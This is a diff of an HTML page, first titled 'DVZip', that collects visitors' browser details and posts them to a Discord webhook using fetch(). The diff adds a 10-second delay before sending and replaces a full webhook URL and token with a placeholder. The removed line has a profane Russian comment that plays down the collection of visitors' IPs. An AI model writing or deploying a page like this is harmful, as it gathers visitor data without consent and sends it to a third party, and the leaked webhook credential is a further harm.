@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DVZip</title>
+    <title>Информация о пользователе</title>
     <style>
         body {
             background-color: black;
@@ -29,10 +29,11 @@
     </style>
 </head>
 <body>
+    <h1>Информация о пользователе</h1>
     <noscript>Пожалуйста, включите JavaScript в вашем браузере для корректной работы сайта.</noscript>
     <div id="info"></div>
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1105111457869336596/SUe8UVJCwIKP6K8KqLhfPcxTxS7a2X47dPO3H9Kean6LpxLxZhnFrPxVtKcUm1zmdBd9" /// Тот кто нахуй тронет этот вебхук выебу, я его использую для получения статистики, ваш не нужный айпи никому не идет. 
+        const webhookUrl = 'https://discord.com/api/webhooks/...'; // замените на URL вашего вебхука
 
         let info = "<p>Имя браузера: " + navigator.appName + "</p>" +
             "<p>Версия браузера: " + navigator.appVersion + "</p>" +
@@ -80,15 +81,18 @@
               window.location.href = '/other-page.html';
           }
       });
+
       function sendMessage(message) {
           message = message.replace(/<[^>]*>/g, '\n');
+          setTimeout(() => {
               fetch(webhookUrl, {
                   method: 'POST',
                   headers: {
                       'Content-Type': 'application/json'
                   },
-                  body: JSON.stringify({ content: message + '\n ----'})
+                  body: JSON.stringify({ content: message })
               });
+          }, 10000);
       }
     </script>
 </body>
